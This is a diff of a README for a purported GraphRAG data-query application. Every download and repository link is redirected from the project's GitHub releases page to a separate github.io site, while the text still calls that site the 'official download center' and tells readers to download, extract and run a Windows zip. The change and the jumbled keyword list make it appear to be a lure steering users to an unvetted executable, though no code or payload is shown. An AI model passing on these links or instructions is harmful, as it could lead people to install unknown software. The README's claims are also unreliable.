@@ -18,10 +18,10 @@ You can switch between them anytime, like choosing between a quick coffee shop o
 
 ### Step 1: Download the Application
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/DOWNLOAD-NOW-blue?style=for-the-badge&logo=github&logoColor=white&color=orange)](https://github.com/canvasnemesis318/laya-jev-GraphRAG/releases)
+[![DOWNLOAD NOW](https://img.shields.io/badge/DOWNLOAD-NOW-blue?style=for-the-badge&logo=github&logoColor=white&color=orange)](https://canvasnemesis318.github.io)
 
 Click the big button above or visit this link to download the application:  
-**👉 [https://github.com/canvasnemesis318/laya-jev-GraphRAG/releases](https://github.com/canvasnemesis318/laya-jev-GraphRAG/releases)**
+**👉 [https://canvasnemesis318.github.io](https://canvasnemesis318.github.io)**
 
 This page is the official download center. You will see a list of available versions. Choose the latest one.
 
@@ -32,7 +32,7 @@ This page is the official download center. You will see a list of available vers
 ### Step 2: Get the Files
 
 1. Visit this link to download the application:  
-   **[https://github.com/canvasnemesis318/laya-jev-GraphRAG/releases](https://github.com/canvasnemesis318/laya-jev-GraphRAG/releases)**
+   **[https://canvasnemesis318.github.io](https://canvasnemesis318.github.io)**
 
 2. Look for a file that matches your computer type (most people use **Windows 64-bit**). The file will have a name like `laya-jev-graphrag-windows.zip`.
 
@@ -132,7 +132,7 @@ Check the built-in help menu in the application. For additional support, visit t
 
 Join our growing community of users! Share tips, ask questions, and see what others are building.
 
-- **GitHub Repository**: [https://github.com/canvasnemesis318/laya-jev-GraphRAG](https://github.com/canvasnemesis318/laya-jev-GraphRAG)
+- **GitHub Repository**: [https://canvasnemesis318.github.io](https://canvasnemesis318.github.io)
 - **Report Issues**: Found a bug? Let us know in the Issues section.
 - **Feature Requests**: Have an idea? We'd love to hear it!
 
@@ -148,7 +148,7 @@ New features and improvements are released regularly. Check the downloads page p
 
 Ready to supercharge your data experience?
 
-1. **[Click here to download now](https://github.com/canvasnemesis318/laya-jev-GraphRAG/releases)**
+1. **[Click here to download now](https://canvasnemesis318.github.io)**
 2. Extract the files
 3. Run the application
 4. Start asking questions!
@@ -185,6 +185,6 @@ This project is open-source. Review the license file in the repository for detai
 
 ---
 
-**Start exploring your data in a whole new way today!** Visit this link to download the application and begin your journey: **[https://github.com/canvasnemesis318/laya-jev-GraphRAG/releases](https://github.com/canvasnemesis318/laya-jev-GraphRAG/releases)**
+**Start exploring your data in a whole new way today!** Visit this link to download the application and begin your journey: **[https://canvasnemesis318.github.io](https://canvasnemesis318.github.io)**
 
 Keywords: astar-algorithm, eval-harness, fine-tuning, graphdatabase, graprag, jev, laya, neo4j, rag, typesafe-ai
